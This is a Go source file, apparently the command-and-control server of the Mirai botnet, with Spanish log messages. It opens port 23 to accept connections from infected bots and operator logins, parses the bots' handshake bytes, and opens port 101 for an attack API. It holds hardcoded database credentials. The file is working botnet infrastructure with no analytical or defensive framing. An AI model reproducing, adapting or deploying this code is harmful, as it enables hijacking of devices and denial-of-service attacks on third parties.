package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "mirai"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    fmt.Println("[CNC] Abriendo puerto 23...")

    tel, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println(err)
        return
    }

    fmt.Println("[CNC] Puerto 23 abierto.")

    fmt.Println("[CNC] Abriendo puerto 101...")

    api, err := net.Listen("tcp", "0.0.0.0:101")
    if err != nil {
        fmt.Println(err)
        return
    }
    
    fmt.Println("[CNC] Puerto 101 abierto.")

    fmt.Println("[CNC] Escuchando...")

    go func() {
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("[CNC] Finalizado.")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    fmt.Println("[CNC] Conexión entrante!")

    if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        fmt.Println("[CNC] Es un bot.")
        if buf[3] > 0 {
            if l <= 4 {
                l, err := conn.Read(buf)
                if err != nil || l <= 0 {
                    return
                }
            } else {
                for jj := 0; jj < 32; jj++ {
                    if jj < 28 {
                        buf[jj] = buf[jj + 4]
                    } else {
                        buf[jj] = 0
                    }
                }
                l = l - 4
            }
            
            string_len := make([]byte, 1)
            string_len[0] = buf[0]

            fmt.Printf("[CNC] string_len: %d\n", string_len[0])

            if l <= 1 {
                l, err := conn.Read(buf)
                if err != nil || l <= 0 {
                    return
                }
            } else {
                for jj := 0; jj < 32; jj++ {
                    if jj < 31 {
                        buf[jj] = buf[jj + 1]
                    } else {
                        buf[jj] = 0
                    }
                }
                l = l - 1
            }
            
            var source string
            if int(string_len[0]) > 0 {
                source_buf := make([]byte, string_len[0])
                for jj := 0; jj < int(string_len[0]); jj++ {
                    source_buf[jj] = buf[jj]
                }
                source = string(source_buf)
            }
            fmt.Printf("[CNC] source: %s\n", source)
            NewBot(conn, buf[3], source).Handle()
fmt.Println("[CNC] Fin del handler")
        } else {
            fmt.Printf("[CNC] No source.\n")
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        fmt.Println("[CNC] Es un login.")
        NewAdmin(conn).Handle()
    }
}

func apiHandler(conn net.Conn) {
    fmt.Println("[CNC] Api handler")
    defer conn.Close()
    NewApi(conn).Handle()
    fmt.Println("[CNC] End of api handler")
}

func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
